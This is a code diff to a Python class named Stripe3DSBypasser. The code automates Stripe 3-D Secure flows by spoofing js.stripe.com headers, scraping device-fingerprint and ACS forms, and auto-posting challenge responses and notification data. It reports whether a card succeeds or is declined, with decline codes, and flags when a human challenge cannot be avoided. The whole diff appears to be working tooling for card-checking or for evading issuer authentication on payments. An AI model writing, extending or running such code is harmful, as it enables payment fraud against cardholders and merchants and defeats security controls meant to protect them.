@@ -114,24 +114,28 @@ def _html_challenge(html_text: str) -> bool:
     return bool(re.search(r'name=["\'](?:otp|passcode|challenge_code|sms_code)["\']', html_text, re.I))
 
 
+def _as_dict(val) -> dict:
+    return val if isinstance(val, dict) else {}
+
+
 def _parse_form(html_text: str, base_url: str = ""):
     action = None
     m = re.search(r'<form[^>]+action=["\']([^"\']*)["\']', html_text, re.I)
     if m:
         raw_action = html.unescape(m.group(1)).strip()
-        # action="" or action="#" posts to current page URL (base_url)
-        action = urljoin(base_url, raw_action) if (base_url and raw_action) else (raw_action or base_url)
-    elif '<form' in html_text.lower():
-        # Form exists without action attribute -> posts to current URL
+        if (not raw_action) or raw_action == "#":
+            action = base_url
+        else:
+            action = urljoin(base_url, raw_action) if base_url else raw_action
+    elif "<form" in html_text.lower():
         action = base_url
     fields = {}
-    for tag in re.finditer(r"<input[^>]+>", html_text, re.I):
+    for tag in re.finditer(r"<input[^>]+/?>", html_text, re.I):
         t = tag.group(0)
         n = re.search(r'name=["\']([^"\']+)["\']', t, re.I)
         v = re.search(r'value=["\']([^"\']*)["\']', t, re.I)
         if n:
-            val = html.unescape(v.group(1)) if v else ""
-            fields[n.group(1)] = val
+            fields[n.group(1)] = html.unescape(v.group(1)) if v else ""
     return action, fields
 
 
@@ -276,7 +280,7 @@ class Stripe3DSBypasser:
             "Origin": "https://js.stripe.com",
             "Referer": "https://js.stripe.com/",
         }
-        html = ""
+        html_text = ""
         current_method_url = method_url
         try:
             async with session.post(
@@ -286,22 +290,22 @@ class Stripe3DSBypasser:
                 timeout=14,
                 allow_redirects=True,
             ) as r:
-                html = await _text(r)
+                html_text = await _text(r)
                 current_method_url = str(getattr(r, "url", method_url))
         except Exception as ex:
             print(f"[3DS] method URL error: {ex}")
             return
 
         device_fp_url = None
-        m = re.search(r'submitDataAndForm\(["\']+(https?://[^"\']+/devicefingerprint)["\']', html)
+        m = re.search(r'submitDataAndForm\(["\']+(https?://[^"\']+/devicefingerprint)["\']', html_text)
         if m:
             device_fp_url = m.group(1)
-        elif "safekey" in html.lower() or "deviceidentification" in html.lower():
-            m_action = re.search(r'<form[^>]+action=["\']([^"\']+)["\']', html, re.I)
+        elif "safekey" in html_text.lower() or "deviceidentification" in html_text.lower():
+            m_action = re.search(r'<form[^>]+action=["\']([^"\']+)["\']', html_text, re.I)
             if m_action:
                 device_fp_url = urljoin(current_method_url, html.unescape(m_action.group(1)))
         if not device_fp_url:
-            m_action = re.search(r'<form[^>]+action=["\']([^"\']+)["\']', html, re.I)
+            m_action = re.search(r'<form[^>]+action=["\']([^"\']+)["\']', html_text, re.I)
             if m_action and "fingerprint" in m_action.group(1).lower():
                 device_fp_url = urljoin(current_method_url, html.unescape(m_action.group(1)))
 
@@ -368,10 +372,18 @@ class Stripe3DSBypasser:
             except Exception as fp_ex:
                 print(f"[3DS] device FP error: {fp_ex}")
 
-        if notify_url:
+        nm = re.search(
+            r'name=["\']threeDSMethodNotificationURL["\'][^>]*value=["\']([^"\']+)["\']',
+            html_text, re.I,
+        ) or re.search(
+            r'value=["\']([^"\']+)["\'][^>]*name=["\']threeDSMethodNotificationURL["\']',
+            html_text, re.I,
+        )
+        hidden_notify = html.unescape(nm.group(1)) if nm else None
+        for nurl in filter(None, (hidden_notify, notify_url)):
             try:
                 async with session.post(
-                    notify_url,
+                    nurl,
                     data=urlencode({"threeDSMethodData": method_b64}),
                     headers={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": ua},
                     timeout=6,
@@ -633,26 +645,26 @@ class Stripe3DSBypasser:
                 status = auth_d.get("status") or auth_d.get("state")
                 if status == "succeeded":
                     return {"success": True, "status": "succeeded", "raw_response": auth_d}
-                na = auth_d.get("next_action") or {}
-                ares = auth_d.get("ares") or auth_d.get("a_res") or {}
+                na = _as_dict(auth_d.get("next_action"))
+                ares = _as_dict(auth_d.get("ares") or auth_d.get("a_res"))
                 trans = (ares.get("transStatus") or ares.get("trans_status") or "").upper()
                 if trans == "Y" or status in ("succeeded", "requires_capture"):
                     return {"success": True, "status": status or "succeeded", "raw_response": auth_d}
-                if isinstance(na, dict) and na:
+                if na:
                     if na.get("type") == "redirect_to_url":
                         return await cls._resolve_redirect_url(
                             session, (na.get("redirect_to_url") or {}).get("url"),
                             pi_id, client_secret, pk_key, profile, depth + 1,
                         )
                     inner = na.get("use_stripe_sdk") or na
-                    inner_dict = inner if isinstance(inner, dict) else {}
+                    inner_dict = _as_dict(inner)
                     if (na.get("type") in ("use_stripe_sdk", "stripe_3ds2_challenge")
                             or inner_dict.get("type") == "stripe_3ds2_challenge"
                             or inner_dict.get("acs_url") or inner_dict.get("creq")):
                         # challenge surfaced after fingerprint — fall into CReq
                         sdk_data = cls._merge_sdk(na if na.get("use_stripe_sdk") or na.get("type") else {"use_stripe_sdk": inner_dict})
                         _ch3 = sdk_data.get("three_ds_2_challenge")
-                        _ch3_dict = _ch3 if isinstance(_ch3, dict) else {}
+                        _ch3_dict = _as_dict(_ch3)
                         acs_url = sdk_data.get("acs_url") or _ch3_dict.get("acs_url") or acs_url
                         creq = sdk_data.get("creq") or _ch3_dict.get("creq") or creq
                         session_data = (
@@ -697,19 +709,19 @@ class Stripe3DSBypasser:
                 timeout=15,
                 allow_redirects=True,
             ) as r:
-                html = await _text(r)
+                html_text = await _text(r)
                 final_url = str(getattr(r, "url", acs_url))
         except Exception as ex:
             print(f"[3DS] CReq error: {ex}")
             return None
 
-        if _html_challenge(html):
+        if _html_challenge(html_text):
             print(f"[3DS] interactive challenge at {final_url}")
             return {"success": False, "status": "requires_action", "challenge_required": True, "challenge_url": final_url}
 
         # frictionless ACS auto-posts CRes back to TermUrl / notification URL
         # pass final_url as base_url so relative form actions resolve correctly
-        c_url, c_data = _parse_form(html, base_url=final_url)
+        c_url, c_data = _parse_form(html_text, base_url=final_url)
         if c_url and c_data:
             try:
                 async with session.post(
@@ -743,16 +755,16 @@ class Stripe3DSBypasser:
                 timeout=10,
                 allow_redirects=True,
             ) as r:
-                html = await _text(r)
+                html_text = await _text(r)
                 final_url = str(getattr(r, "url", redirect_url))
 
-            if _html_challenge(html):
+            if _html_challenge(html_text):
                 print(f"[3DS] challenge on landing {final_url}")
                 return {"success": False, "status": "requires_action", "challenge_required": True, "challenge_url": final_url}
 
-            acs_url, form_data = _parse_form(html, base_url=final_url)
+            acs_url, form_data = _parse_form(html_text, base_url=final_url)
             if not acs_url:
-                m_url = re.search(r'location\.href\s*=\s*["\']([^"\']+)["\']', html)
+                m_url = re.search(r'location\.href\s*=\s*["\']([^"\']+)["\']', html_text)
                 if m_url:
                     acs_url = urljoin(final_url, html.unescape(m_url.group(1)))
 
@@ -764,12 +776,12 @@ class Stripe3DSBypasser:
                     timeout=10,
                     allow_redirects=True,
                 ) as acs_res:
-                    acs_html = await _text(acs_res)
+                    acs_html_text = await _text(acs_res)
                     acs_final = str(getattr(acs_res, "url", acs_url))
-                    if _html_challenge(acs_html):
+                    if _html_challenge(acs_html_text):
                         print(f"[3DS] interactive ACS {acs_final}")
                         return {"success": False, "status": "requires_action", "challenge_required": True, "challenge_url": acs_final}
-                    c_url, c_data = _parse_form(acs_html, base_url=acs_final)
+                    c_url, c_data = _parse_form(acs_html_text, base_url=acs_final)
                     if c_url and c_data:
                         async with session.post(
                             c_url,
@@ -809,11 +821,13 @@ class Stripe3DSBypasser:
                             return {"success": True, "status": status, "raw_response": d}
                         if status == "requires_payment_method":
                             err = d.get("last_payment_error") or d.get("last_setup_error") or d.get("error") or {}
+                            err_dict = _as_dict(err)
+                            err_msg = err_dict.get("message") if err_dict else (str(err) if err else "Card declined")
                             return {
                                 "success": False,
                                 "status": "declined",
-                                "decline_code": err.get("decline_code") or err.get("code") or "card_declined",
-                                "error": err.get("message") or "Card declined",
+                                "decline_code": err_dict.get("decline_code") or err_dict.get("code") or "card_declined",
+                                "error": err_msg,
                                 "raw_response": d,
                             }
                         if status not in ("processing", "requires_action"):
@@ -826,8 +840,9 @@ class Stripe3DSBypasser:
         # Poll exhausted — if still requires_action, re-enter 3DS handler once on updated next_action (depth + 1)
         if isinstance(last_d, dict) and last_d.get("status") == "requires_action" and _reenter and depth < 2:
             pi_obj = last_d.get("payment_intent") or last_d.get("setup_intent") or last_d
-            updated_na = pi_obj.get("next_action") or last_d.get("next_action")
-            updated_cs = pi_obj.get("client_secret") or client_secret
+            pi_dict = _as_dict(pi_obj)
+            updated_na = pi_dict.get("next_action") or last_d.get("next_action")
+            updated_cs = pi_dict.get("client_secret") or client_secret
             if updated_na and isinstance(updated_na, dict):
                 act = updated_na.get("type", "")
                 if act == "redirect_to_url":
@@ -885,9 +900,7 @@ class Stripe3DSBypasser:
                 timeout=30,
             ) as sess:
                 act_type = next_action.get("type")
-                sdk_block = next_action.get("use_stripe_sdk") or {}
-                if not isinstance(sdk_block, dict):
-                    sdk_block = {}
+                sdk_block = _as_dict(next_action.get("use_stripe_sdk"))
                 outcome = None
 
                 sdk_type = sdk_block.get("type") or act_type
@@ -896,9 +909,10 @@ class Stripe3DSBypasser:
                 # leftover acs_url keys — routing them here skips method and ACS returns C.
                 is_explicit_challenge = sdk_type in ("stripe_3ds2_challenge", "three_ds_2_challenge")
                 if is_explicit_challenge and (sdk_block.get("acs_url") or sdk_block.get("creq")):
-                    acs_url = sdk_block.get("acs_url") or (sdk_block.get("three_ds_2_challenge") or {}).get("acs_url")
-                    creq = sdk_block.get("creq") or (sdk_block.get("three_ds_2_challenge") or {}).get("creq")
-                    sdata = sdk_block.get("three_ds_session_data") or sdk_block.get("threeDSSessionData") or ""
+                    ch = _as_dict(sdk_block.get("three_ds_2_challenge"))
+                    acs_url = sdk_block.get("acs_url") or ch.get("acs_url")
+                    creq = sdk_block.get("creq") or ch.get("creq")
+                    sdata = sdk_block.get("three_ds_session_data") or sdk_block.get("threeDSSessionData") or ch.get("three_ds_session_data") or ""
                     if acs_url and creq:
                         creq_out = await cls._post_creq(sess, acs_url, creq, sdata, profile)
                         if creq_out and creq_out.get("challenge_required"):
